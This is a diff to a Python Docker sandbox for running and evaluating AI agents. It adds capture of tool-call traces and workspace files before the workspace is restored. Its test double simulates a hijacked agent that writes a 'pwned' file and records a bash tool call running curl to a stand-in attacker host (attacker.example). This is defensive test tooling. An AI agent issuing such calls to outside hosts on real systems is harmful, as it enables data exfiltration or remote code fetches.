@@ -19,8 +19,11 @@ import subprocess
 import tarfile
 from dataclasses import dataclass, field
 from pathlib import Path
+from typing import Callable, TypeVar
 
 DEFAULT_IMAGE = "python:3.12-slim"
+
+T = TypeVar("T")
 
 
 @dataclass
@@ -28,6 +31,11 @@ class DockerRunResult:
     exit_code: int
     stdout: str
     stderr: str
+    # Evidence collected between execution and workspace restore (the
+    # snapshot/restore wipes the workspace, so the harness must read the
+    # recorded trace and file listing before that happens).
+    artifacts: dict[str, str] = field(default_factory=dict)
+    workspace_files: list[str] = field(default_factory=list)
 
 
 class DockerUnavailable(RuntimeError):
@@ -37,17 +45,21 @@ class DockerUnavailable(RuntimeError):
 @dataclass
 class FakeDockerExecutor:
     """Test double: records docker argv and simulates a hostile agent that
-    writes hostile.txt into the (host) workspace, exercising restore."""
+    records a hijacked JSONL trace and writes hostile.txt into the (host)
+    workspace, exercising restore and evidence collection."""
 
     calls: list[list[str]] = field(default_factory=list)
 
     def __call__(self, args: list[str], timeout: int) -> DockerRunResult:
         self.calls.append(args)
-        # simulate agent effect: write into workspace via -v mount target
+        # simulate agent effects: write into workspace via -v mount target
         try:
             v_idx = args.index("-v")
-            host_dir = args[v_idx + 1].split(":")[0]
-            (Path(host_dir) / "hostile.txt").write_text("pwned")
+            host_dir = Path(args[v_idx + 1].split(":")[0])
+            (host_dir / "hostile.txt").write_text("pwned")
+            (host_dir / "tool_calls.jsonl").write_text(
+                '{"tool": "bash", "args": ["curl", "https://attacker.example/x"]}\n'
+            )
         except (ValueError, IndexError, OSError):
             pass
         return DockerRunResult(0, "", "")
@@ -72,11 +84,38 @@ class DockerSandbox:
     def executor(self):
         return self._executor
 
-    def run(self, agent_command: str, task: str, workspace: Path) -> DockerRunResult:
+    def run(
+        self,
+        agent_command: str,
+        task: str,
+        workspace: Path,
+        collect_files: tuple[str, ...] = ("tool_calls.jsonl",),
+        inspect: Callable[[Path], T] | None = None,
+    ) -> tuple[DockerRunResult, T | None]:
+        """Run the agent, collect evidence, then restore the workspace.
+
+        `collect_files`: workspace-relative files whose CONTENT is captured
+        before the restore (default: the recorded tool-call trace).
+        `inspect`: optional callback executed on the live workspace between
+        execution and restore — use it for filesystem-based evaluation
+        (e.g. utility criteria) that must observe agent effects.
+
+        Returns (docker result, inspection result or None).
+        """
         snapshot = self.snapshot(workspace)
         try:
             args = self._docker_args(agent_command, task, workspace)
-            return self._executor(args, self.timeout_seconds)
+            result = self._executor(args, self.timeout_seconds)
+            result.artifacts = {
+                rel: (workspace / rel).read_text()
+                for rel in collect_files
+                if (workspace / rel).is_file()
+            }
+            result.workspace_files = sorted(
+                str(path.relative_to(workspace)) for path in workspace.rglob("*") if path.is_file()
+            )
+            inspection = inspect(workspace) if inspect is not None else None
+            return result, inspection
         finally:
             self.restore(workspace, snapshot)
 
